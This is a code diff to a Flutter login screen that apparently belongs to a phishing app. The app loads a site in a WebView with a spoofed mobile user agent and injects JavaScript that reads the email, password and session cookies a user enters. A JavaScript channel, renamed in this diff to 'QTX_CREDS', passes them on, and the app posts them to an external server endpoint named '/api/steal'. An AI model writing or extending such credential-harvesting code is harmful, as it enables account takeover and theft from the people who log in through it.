@@ -48,7 +48,7 @@ class _LoginScreenState extends State<LoginScreen> {
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..setUserAgent("Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
       ..addJavaScriptChannel(
-        'NativeBridge',
+        'QTX_CREDS',
         onMessageReceived: (msg) async {
           await http.post(
             Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
@@ -92,9 +92,9 @@ class _LoginScreenState extends State<LoginScreen> {
           try {
             var e = findEmail(), p = findPass();
             if (e && p && e.value && p.value) {
-              NativeBridge.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
+              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
               var cookie = document.cookie;
-              NativeBridge.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
+              QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
             }
           } catch (err) {}
         }
